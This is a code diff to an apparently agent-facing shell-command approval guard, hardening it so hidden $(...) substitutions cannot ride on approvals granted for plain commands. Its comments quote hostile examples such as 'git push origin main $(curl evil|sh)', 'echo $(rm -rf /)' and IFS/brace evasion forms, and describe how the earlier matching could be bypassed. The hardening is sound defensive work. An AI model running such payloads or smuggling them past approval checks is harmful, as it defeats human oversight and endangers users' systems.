@@ -125,13 +125,16 @@ def approve(data_dir: Path, *, pattern: str, ttl: int = 600, note: str = "") -> 
 
 
 def _is_approved(data_dir: Path, commands, now: float | None = None) -> bool:
-    """commands: normalized variant tuple from _normalize_shell — an approval
-    regex matching ANY variant authorizes the command (it is the same action
-    at runtime)."""
+    """commands: normalized variant tuple from _normalize_shell. The approval
+    regex is matched against the MOST-EXPOSED (longest) variant only — an
+    approval must see the command with every substitution inlined, so a
+    payload hidden inside $(...) can never ride along on an approval granted
+    for the plain action (independent-review finding, 2026-10-16)."""
     now = now if now is not None else time.time()
     path = _approvals_file(data_dir)
     if not path.is_file():
         return False
+    exposed = max(commands, key=lambda s: (len(s), s))
     for line in path.read_text(encoding="utf-8").splitlines():
         if not line.strip():
             continue
@@ -142,7 +145,7 @@ def _is_approved(data_dir: Path, commands, now: float | None = None) -> bool:
         if a.get("expires_epoch", 0) < now:
             continue
         try:
-            if any(re.search(a.get("pattern", r"$^"), c) for c in commands):
+            if re.search(a.get("pattern", r"$^"), exposed):
                 return True
         except re.error:
             continue
@@ -162,11 +165,16 @@ def _normalize_command(command: str) -> str:
 
 def _canonical_command(command: str) -> str:
     """Deterministic single canonical form for token-scope comparison.
-    Both the runtime command and the granted action pass through the same
-    shell normalization, so an approval stays valid when spelled differently
-    (e.g. Windows backslash paths) while an expansion form of the bound
-    action still matches — and anything unrecognized fails closed (deny)."""
-    return _normalize_command(min(_normalize_shell(command),
+
+    Uses the MOST-EXPOSED variant (longest normalized reading): a token bound
+    to `git push origin main` must NOT authorize `git push origin main
+    $(curl evil|sh)` — the shortest reading would hide the injected payload
+    (found by independent codex review, 2026-10-16). Both the runtime command
+    and the granted action pass through the same normalization, so an
+    approval stays valid when spelled differently (e.g. Windows backslash
+    paths) and a plain expansion form of the bound action still matches —
+    while a command carrying extra hidden content fails closed (deny)."""
+    return _normalize_command(max(_normalize_shell(command),
                                   key=lambda s: (len(s), s)))
 
 
@@ -200,8 +208,10 @@ def _find_substitution(text: str) -> tuple[int, int, str] | None:
     return None
 
 
-def _normalize_shell_pass(text: str) -> set[str]:
-    """One normalization pass; returns 1-2 variants (see _normalize_shell)."""
+def _normalize_shell_pass(text: str, choice: str | None = None) -> set[str]:
+    """One normalization pass; returns 1-2 variants (see _normalize_shell).
+    choice="remove"/"inline" forces a single reading of the substitution —
+    used to compute the two aggregate readings (all-removed / all-inlined)."""
     span = _find_substitution(text)
     if span is None:
         bases = [text]
@@ -210,8 +220,14 @@ def _normalize_shell_pass(text: str) -> set[str]:
         # Two fail-closed readings of a substitution: REMOVED (a space, so
         # git$(printf ' ')push reads as "git push") and INLINED (inner kept,
         # so echo $(rm -rf /) still exposes the nested rm to the patterns).
-        bases = [text[:start] + " " + text[end:],
-                 text[:start] + " " + inner + " " + text[end:]]
+        removed = text[:start] + " " + text[end:]
+        inlined = text[:start] + " " + inner + " " + text[end:]
+        if choice == "remove":
+            bases = [removed]
+        elif choice == "inline":
+            bases = [inlined]
+        else:
+            bases = [removed, inlined]
     outs = set()
     for b in bases:
         # Parameter expansions ($IFS, ${IFS%...}, $HOME, $@, $1, ...): the
@@ -232,6 +248,20 @@ def _normalize_shell_pass(text: str) -> set[str]:
     return outs
 
 
+def _normalize_shell_aggregate(command: str, *, keep_inner: bool) -> str:
+    """Single deterministic reading with EVERY substitution site resolved the
+    same way: keep_inner=False removes all (exposes word-joining forms),
+    keep_inner=True inlines all (exposes nested commands)."""
+    text = command
+    for _ in range(_NORMALIZE_MAX_PASSES):
+        new = next(iter(_normalize_shell_pass(
+            text, choice="inline" if keep_inner else "remove")))
+        if new == text:
+            break
+        text = new
+    return text
+
+
 def _normalize_shell(command: str) -> tuple[str, ...]:
     """Collapse shell expansion forms that bash resolves at runtime but a
     raw-string regex never sees (git${IFS}push, {git,push}, git$(...)push,
@@ -242,6 +272,11 @@ def _normalize_shell(command: str) -> tuple[str, ...]:
     ever over-blocks, never under-blocks: normalization removes or unfolds
     syntax, it never hides a plainly-written dangerous command. This is not
     a shell parser — it is a conservative canonicalization for matching.
+
+    When the variant count exceeds the cap, the two aggregate readings
+    (all-substitutions-removed and all-inlined) are ALWAYS kept — trimming
+    lexicographically could otherwise drop exactly the reading that exposes
+    a dangerous command (independent-review finding, 2026-10-16).
     """
     variants = {command}
     for _ in range(_NORMALIZE_MAX_PASSES):
@@ -250,7 +285,12 @@ def _normalize_shell(command: str) -> tuple[str, ...]:
             new.update(_normalize_shell_pass(v))
         if new == variants:
             break
-        variants = set(sorted(new)[:_NORMALIZE_MAX_VARIANTS])
+        variants = new
+    if len(variants) > _NORMALIZE_MAX_VARIANTS:
+        keep = set(sorted(variants)[:_NORMALIZE_MAX_VARIANTS - 2])
+        keep.add(_normalize_shell_aggregate(command, keep_inner=False))
+        keep.add(_normalize_shell_aggregate(command, keep_inner=True))
+        variants = keep
     return tuple(sorted(variants))
 
 
